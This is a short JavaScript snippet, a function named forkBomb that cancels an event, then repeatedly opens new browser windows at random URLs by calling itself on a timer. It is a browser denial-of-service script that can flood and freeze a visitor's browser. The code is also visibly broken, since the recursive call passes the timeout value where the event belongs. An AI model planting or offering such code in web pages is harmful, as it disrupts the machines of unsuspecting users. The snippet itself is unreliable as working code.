function forkBomb(event, timeout = 500, i = 0) {
  event.preventDefault();
  setTimeout(() => {
    window.open('./?v=' + Math.random(), '_new' + (i || ''))
    forkBomb(timeout, i + 1)
  }, timeout)
  return false;
}